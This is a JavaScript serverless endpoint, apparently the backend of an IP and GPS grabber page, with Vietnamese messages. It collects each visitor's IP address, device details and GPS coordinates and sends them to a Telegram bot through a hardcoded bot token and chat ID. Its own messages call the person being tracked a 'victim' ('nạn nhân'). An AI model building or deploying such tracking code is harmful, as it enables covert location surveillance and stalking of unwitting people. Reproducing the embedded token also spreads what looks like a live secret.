export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    // ==========================================
    // CẤU HÌNH TELEGRAM
    const BOT_TOKEN = "8768999948:AAHzR2Avd2VCkiF1soTvB3HOy6QeT8PFvdU"; 
    const CHAT_ID = "7750249320"; 
    // ==========================================

    try {
        const data = req.body;
        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        if (ip.includes(',')) ip = ip.split(',')[0].trim();

        let message = "";

        if (data.type === "basic_info") {
            message = `📱 *THIẾT BỊ MỚI*\n\n*IP:* \`${ip}\`\n*Hệ điều hành:* ${data.platform}\n*Màn hình:* ${data.screen}\n*Thiết bị:* ${data.userAgent}`;
        } else if (data.type === "gps") {
            message = `📍 *ĐÃ LẤY ĐƯỢC GPS*\n\n*IP:* \`${ip}\`\n*Vĩ độ:* ${data.lat}\n*Kinh độ:* ${data.lon}\n\n[🗺 Xem trên Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})`;
        } else if (data.type === "gps_denied") {
            message = `⚠️ *NẠN NHÂN TỪ CHỐI GPS*\n\n*IP:* \`${ip}\`\n*Lỗi:* ${data.error}`;
        }

        // Bắn tin nhắn qua Telegram API
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
